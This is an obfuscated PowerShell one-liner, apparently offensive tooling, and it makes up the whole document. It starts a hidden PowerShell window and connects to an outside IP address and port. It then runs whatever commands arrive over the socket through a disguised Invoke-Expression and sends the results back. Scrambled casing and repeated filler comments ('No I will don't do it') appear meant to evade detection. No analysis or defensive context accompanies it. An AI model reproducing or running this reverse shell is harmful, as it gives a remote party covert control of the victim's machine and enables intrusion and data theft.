powershell -c "Start-Process $PSHOME\powershell.exe -ArgumentList {$PeOple = New-Object <#      No I will don't do it       #><#      No I will don't do it       #><#      No I will don't do it       #> NeT.SoCkeTS.TCPClIEnt('3.6.30.85',16743); <#      No I will don't do it       #><#      No I will don't do it       #><#      No I will don't do it       #> $stream = $PeOple.GEtStReam();[byte[]]$bytes = 0..65535|%{0};while(($IKKK = $stream.REad($bytes, 0, $bytes.LeNgth)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncodIng).GEtStRIng($bytes,0, $IKKK); <#      No I will don't do it       #><#      No I will don't do it       #><#      No I will don't do it       #> $sendback = (i""e''x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + ($UnKKK).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetByTes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length); <#      No I will don't do it       #><#      No I will don't do it       #><#      No I will don't do it       #><#      No I will don't do it       #> $stream.Flush()};$PeOple.ClOSe()} -WIndoWStyle HiDDen"
